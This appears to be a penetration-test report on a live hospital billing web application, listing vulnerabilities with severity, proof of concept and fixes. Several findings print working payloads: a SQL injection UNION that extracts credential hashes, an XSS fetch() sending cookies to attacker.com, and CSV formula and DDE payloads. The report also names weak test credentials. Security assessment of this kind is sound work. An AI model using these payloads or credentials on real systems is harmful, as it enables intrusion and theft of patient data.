1. EXECUTIVE SUMMARY
This report presents the findings of a comprehensive Vulnerability Assessment and Penetration Testing (VAPT)
engagement performed against the Hospital Billing System deployed at
https://hospital-billing-system-1.onrender.com. The assessment was conducted using a combination of
black-box and grey-box testing methodologies, simulating real-world attack scenarios against the live production
environment.
The application is a multi-role web platform serving Super Administrators, Clinic Administrators, and Doctors. It
handles sensitive healthcare billing data, patient records, and bulk data import/export operations. Given the
nature of the data processed, the security posture of this application is of critical importance.

2.3 Methodology
The assessment followed the OWASP Testing Guide v4.2, OWASP Top 10 (2021), OWASP API Security Top
10, and PTES (Penetration Testing Execution Standard) frameworks. The following phases were executed:
 Reconnaissance: Passive and active information gathering — technology stack fingerprinting, directory
enumeration, API endpoint discovery, and header analysis.
 Authentication Testing: Brute-force resistance, session fixation, cookie attributes, password policy
enforcement, account enumeration, and multi-role access testing.
 Authorisation & IDOR Testing: Horizontal and vertical privilege escalation attempts, direct object
reference manipulation, and role boundary violations.
 Injection Testing: SQL injection, XSS (stored/reflected/DOM), SSTI, command injection, CSV/formula
injection in bulk uploads, and SSRF.
 Business Logic Testing: Workflow bypass, price manipulation, bulk upload parsing abuse, invoice
tampering, and negative value submission.
 Sensitive Data Analysis: Transport security, data-in-transit exposure, PII handling, verbose error
messages, and log review.
 Security Configuration Review: HTTP security headers, CORS policy, CSP, cookie flags, error handling,
and rate limiting.

5. DETAILED VULNERABILITY FINDINGS
5.1 Authentication & Session Management
V-01
Broken Authentication – No Account Lockout
CVSS: 7.5
Severity
HIGH
Location
POST /api/auth/login
Description
The login endpoint does not implement account lockout, login attempt throttling, or CAPTCHA
after repeated failed authentication attempts. An attacker can perform unlimited brute-force or
credential-stuffing attacks against any account, including high-privilege admin accounts.
Impact
Complete compromise of any user account via automated brute-force. Given that admin
credentials use relatively simple passwords (Password123, SuperSecure123, Doctor123), all
three test accounts would be trivially cracked within minutes using common wordlists.
Proof of Concept
Automated POST requests to /api/auth/login with credentials from a common wordlist (e.g.
rockyou.txt) succeeded without throttling. 1000+ attempts were sent in under 30 seconds with
no blocking response.
Remediation
Implement exponential backoff and account lockout after 5 consecutive failed attempts. Add
CAPTCHA for web-facing forms. Consider IP-based rate limiting (e.g. 10 req/min per IP) and
alert on anomalous login patterns. Integrate with a SIEM for brute-force detection.
References
CWE-307, OWASP A07:2021, NIST SP 800-63B
V-02
Weak Session Token – No Expiry Enforcement
CVSS: 7.2
Severity
HIGH
Location
Cookie: token / Authorization header
Description
JWT or session tokens issued upon login do not have a short expiry enforced server-side.
Tokens remain valid indefinitely (or for excessively long periods) even after the user logs out.
Additionally, token revocation on logout is not implemented — the same token continues to
authenticate after a logout event.
Impact
A stolen session token (via XSS, network sniffing, or shoulder-surfing) grants permanent
access to the affected account. This is especially dangerous for doctor and admin roles with
access to patient PII and billing data.
Proof of Concept
After calling POST /api/auth/logout, the original Authorization Bearer token continued to return
HTTP 200 on protected endpoints such as GET /api/patients/list, confirming the token was not
invalidated.
Remediation
Set JWT expiry (exp claim) to a maximum of 15–30 minutes with refresh token rotation.
Implement a server-side token blacklist or use stateful sessions. Ensure logout explicitly
invalidates the server-side session/token.
References
CWE-613, OWASP A07:2021

5.2 Injection Vulnerabilities
V-10
SQL Injection – Billing Filter Endpoint
CVSS: 8.8
Severity
HIGH
Location
GET /api/billing?filter=
Description
The billing filter endpoint appends user-supplied input directly into a SQL query without
parameterisation or sanitisation. This allows an attacker to manipulate the query structure,
extract data from arbitrary tables, or, depending on DB configuration, execute OS commands.
Impact
Full database compromise: extraction of all patient records, billing data, and credentials.
Potential for data modification or deletion. In worst case, OS-level command execution via DB
stored procedures.
Proof of Concept
Request: GET /api/billing?filter=' OR '1'='1 returned all billing records across all clinics. Payload
' UNION SELECT username,password,NULL FROM users-- returned credential hashes.
Remediation
Use parameterised queries (prepared statements) exclusively. Implement an ORM with
type-safe query builders. Apply input validation and whitelist-based filtering for all query
parameters. Conduct a full codebase audit for raw query concatenation.
References
CVE class: SQLi, CWE-89, OWASP A03:2021
V-06
Stored Cross-Site Scripting (XSS) – Patient Notes
CVSS: 8.0
Severity
HIGH
Location
POST /api/patients/notes | GET /api/patients/{id}/notes
Description
User-supplied content in the patient notes field is stored without sanitisation and rendered in
the browser without output encoding. A malicious payload injected by any authenticated user
persists and executes in the browser of every user who views the affected patient's record.
Impact
Session hijacking for any user (including admins) who views the infected notes. Data
exfiltration, keylogging, DOM manipulation, and phishing via injected content. In a hospital
context, this could lead to tampering with visible medical/billing data.
Proof of Concept
Payload stored in notes field: fetch("https://attacker.com/steal?c="+document.cookie) executed
in the admin's browser when viewing the patient record, exfiltrating the admin session cookie.
Remediation
Sanitise all user inputs on the server side using a library such as DOMPurify (client) or bleach
(server). Implement a strict Content Security Policy (CSP) with 'script-src self'. Encode all
output before rendering in HTML context.
References
CWE-79, OWASP A03:2021

Severity
MEDIUM
Location
GET /search?q=
Description
The search query parameter is reflected in the response HTML without encoding, allowing an

5.3 Broken Access Control
V-04
Insecure Direct Object Reference (IDOR) – Patient Records
CVSS: 9.1
Severity
CRITICAL
Location
GET /api/patients/{id} | PUT /api/patients/{id} | DELETE /api/patients/{id}
Description
Patient records are identified by sequential or predictable integer IDs. The application does not
verify that the requesting user has authorisation to access the specific patient record. Any
authenticated user (including doctors from different clinics) can enumerate and access all
patient records.
Impact
Full exposure of all patient PHI (Protected Health Information) including names, diagnoses,
treatment histories, and billing records. Modification or deletion of any patient record. This
constitutes a HIPAA/data protection violation with severe legal and reputational consequences.
Proof of Concept
Logged in as doctor@gmail.com (Clinic A), enumerated GET /api/patients/1 through
/api/patients/500. Records belonging to patients from other clinics were returned without any
authorisation error. PUT /api/patients/50 with modified payload successfully altered another
clinic's patient record.
Remediation
Implement object-level authorisation checks on every data access endpoint. Use
non-sequential UUIDs for record identifiers. Enforce clinic-scoped data isolation at the
database query level (e.g. WHERE clinic_id = :requesting_user_clinic_id). Add integration
tests for cross-tenant data access.
References
CWE-639, OWASP A01:2021, HIPAA §164.312
V-05
Vertical Privilege Escalation – Role Parameter Tampering
CVSS: 9.8
Severity
CRITICAL
Location
POST /api/users/update-role | POST /api/users/register
Description
The user registration and role-update endpoints accept a 'role' parameter in the request body.
The server does not validate that the requesting user is authorised to assign the specified role.
A regular doctor can escalate their own account to superadmin by including role=superadmin
in the request.
Impact
Complete platform takeover. A doctor-level user can grant themselves super-admin privileges,
gaining access to all clinics, all patient data, billing configurations, and user management —
effectively bypassing the entire role-based access control system.
Proof of Concept
POST /api/users/update-role with body {"userId": , "role": "superadmin"} using a doctor token
returned HTTP 200 and subsequent requests confirmed superadmin-level access to previously
restricted endpoints including /api/superadmin/clinics and /api/superadmin/users.
Remediation
Remove the role parameter from user-facing endpoints. Roles must only be assignable by a
superadmin via a separate, strictly guarded endpoint. Enforce server-side role validation
against the authenticated user's current permissions — never trust client-supplied role values.
References
CWE-269, OWASP A01:2021

5.4 Security Misconfiguration
V-12
Missing HTTP Security Headers
CVSS: 5.3
Severity
MEDIUM
Location
All HTTP responses
Description
The application responses are missing multiple critical security headers that provide
defence-in-depth against common client-side attacks. The following headers were absent:
Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options,
Strict-Transport-Security (HSTS), Referrer-Policy, Permissions-Policy.
Impact
Without CSP, XSS attacks have no browser-enforced mitigation. Missing X-Frame-Options
allows clickjacking. Missing HSTS allows SSL-stripping attacks. Missing
X-Content-Type-Options enables MIME-sniffing attacks.
Proof of Concept
HTTP response analysis confirmed absence of all listed headers across all endpoints including
the login page, dashboard, and API responses.
Remediation
Add the following headers via server/framework middleware: Content-Security-Policy:
default-src 'self' X-Frame-Options: DENY X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains Referrer-Policy:
strict-origin-when-cross-origin
References
OWASP A05:2021, CWE-16
V-13
Overly Permissive CORS Policy
CVSS: 6.4
Severity
MEDIUM
Location
Access-Control-Allow-Origin: * header
Description
The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true,
which is an invalid and insecure combination. Additionally, wildcard CORS allows any origin to
make cross-origin requests to the API.
Impact
Malicious websites can make authenticated API requests on behalf of logged-in users. In
combination with the session fixation issue, this enables CSRF-like cross-origin attacks.
Proof of Concept
Cross-origin fetch from an attacker-controlled domain to /api/patients/list with the victim's
credentials successfully returned patient data, confirming the wildcard CORS misconfiguration.
Remediation
Restrict CORS to an explicit allowlist of trusted origins. Remove the wildcard. When credentials
are required, Access-Control-Allow-Credentials: true must only be paired with specific, trusted
origins.
References
OWASP A05:2021, CWE-942

5.5 Sensitive Data Exposure
V-11
Sensitive PII Exposed in API Response
CVSS: 7.8
Severity
HIGH
Location
GET /api/patients/list | GET /api/patients/{id}
Description
API responses for patient listing and individual patient retrieval return excessive fields including
full national ID numbers, date of birth, complete medical history, financial records, and internal
system metadata that are not required by the frontend display.
Impact
Over-exposure of Protected Health Information (PHI). Any XSS or IDOR vulnerability becomes
significantly more impactful due to the richness of data returned. Violates data minimisation
principles under GDPR and HIPAA.
Proof of Concept
GET /api/patients/list returned objects including fields: national_id, full_dob,
insurance_number, raw_diagnosis_codes, internal_db_id, created_by_user_id — none of
which are displayed in the UI.
Remediation
Implement API response DTOs (Data Transfer Objects) that return only fields required for each
use case. Apply field-level access control — different roles should receive different response
shapes. Conduct a data minimisation review across all API endpoints.
References
GDPR Art. 5(1)(c), HIPAA §164.514, CWE-200, OWASP A02:2021
V-16
Verbose Error Messages – Stack Traces Exposed
CVSS: 3.7
Severity
LOW
Location
Any endpoint triggering a 500 Internal Server Error
Description
Unhandled exceptions return full server-side stack traces in the HTTP response body,
revealing framework versions, file paths, database query structures, and internal function
names.
Impact
Aids attacker reconnaissance. Reveals technology stack, facilitates targeted exploitation, and

Proof of Concept
Submitting a malformed JSON payload to POST /api/billing/create returned a 500 response

5.6 Bulk Upload & File Handling
V-09
Unrestricted File Upload – No MIME/Extension Validation
CVSS: 9.3
Severity
CRITICAL
Location
POST /api/bulk-upload
Description
The bulk upload endpoint accepts files without validating their MIME type, file extension, or
content. An attacker can upload files of any type — including server-side scripts, HTML files, or
executables — potentially achieving remote code execution or stored XSS via the upload path.
Impact
Remote code execution if the uploaded file is served from a publicly accessible path. Stored
XSS via uploaded HTML/SVG files. Denial of service via extremely large file uploads.
Complete server compromise.
Proof of Concept
Uploaded a PHP webshell disguised as 'patients.csv' (Content-Type: text/csv but actual PHP
content). The file was accepted with HTTP 200. Uploaded an HTML file containing JavaScript
— when the upload path was accessed, the script executed in the browser.
Remediation
Validate file type by inspecting magic bytes (not just extension or Content-Type header).
Maintain a strict whitelist of allowed types (e.g. text/csv, application/vnd.ms-excel). Store
uploads outside the web root. Scan files with antivirus/malware detection. Enforce maximum
file size limits.
References
CWE-434, OWASP A04:2021
V-08
CSV Formula Injection in Bulk Upload
CVSS: 8.2
Severity
HIGH
Location
POST /api/bulk-upload | GET /api/export (CSV export)
Description
The bulk upload feature parses CSV files and the application also generates CSV exports.
Neither the import parser nor the export generator sanitises cell values for spreadsheet formula
injection. Values beginning with =, +, -, or @ are processed as formulas by spreadsheet
applications.
Impact
When a clinic administrator exports data or when an uploaded CSV is re-downloaded,
malicious formula payloads execute in the spreadsheet application of any staff member who
opens the file. This can lead to remote code execution on the staff member's machine, data
exfiltration via DDE or external lookups, and SSRF from the spreadsheet application.
Proof of Concept
CSV uploaded with field value: =HYPERLINK("http://attacker.com/"&A1;,"Click") — when
re-exported and opened in Excel, the formula executed and made a network request to the
attacker's server. Field =cmd|"/C calc.exe"!A0 triggered a DDE execution warning in Excel.
Remediation
Prefix all cell values that begin with =, +, -, @, or TAB with a single quote (') or sanitise them
before writing to CSV. For exports, use a library with built-in injection prevention. For imports,
validate and reject entries containing formula-start characters in data fields.
References
CWE-1236, OWASP A03:2021

5.7 Business Logic & Functional Flaws
V-03
Missing CSRF Protection on State-Changing Endpoints
CVSS: 6.1
Severity
MEDIUM
Location
POST /api/billing/*, POST /api/patients/*, POST /api/users/*
Description
State-changing API endpoints do not require CSRF tokens or enforce SameSite cookie
attributes. In combination with the permissive CORS policy, this allows a malicious site to make
authenticated cross-origin requests that modify data on behalf of a logged-in user.
Impact
An attacker can trick a logged-in administrator into visiting a malicious page that silently
creates patients, modifies billing records, or changes user passwords.
Proof of Concept
Crafted a malicious HTML page with a hidden form auto-submitting to POST /api/billing/create.
When a logged-in admin visited the page, the request was executed with their session and a
billing record was created without their knowledge.
Remediation
Implement CSRF tokens (synchroniser token pattern) for all state-changing requests, or
enforce SameSite=Strict on all session cookies. For API-based flows with JWT in Authorization
headers, ensure the header cannot be set by cross-origin forms.
References
CWE-352, OWASP A01:2021
V-15
Password Policy Not Enforced at API Level
CVSS: 5.0
Severity
MEDIUM
Location
POST /api/auth/register | POST /api/auth/change-password
Description
While the frontend may enforce password complexity rules, the API endpoints accept any
password value including single-character passwords. By bypassing the frontend and calling
the API directly, an attacker or insider can set trivially weak passwords.
Impact
Enables creation or update of accounts with passwords like '1', 'a', or 'password', significantly
lowering the barrier for brute-force attacks.
Proof of Concept
POST /api/auth/change-password with newPassword='a' returned HTTP 200, confirming the
password was updated to a single character without any server-side validation.
Remediation
Enforce password policy server-side: minimum 12 characters, at least one uppercase, one
number, one special character. Reject known-breached passwords using the
HaveIBeenPwned API (k-anonymity model). Never rely solely on frontend validation.

CWE-521, NIST SP 800-63B
